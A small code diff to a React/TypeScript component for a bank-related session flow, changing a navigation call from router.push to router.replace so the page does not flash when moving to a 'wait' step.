@@ -396,7 +396,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         },
       });
       void flushAuditQueueNow();
-      router.push(stepToPath("wait", sessionId));
+      // ⭐ FLASH YOK: router.push → router.replace
+      router.replace(stepToPath("wait", sessionId));
       return;
     }
 
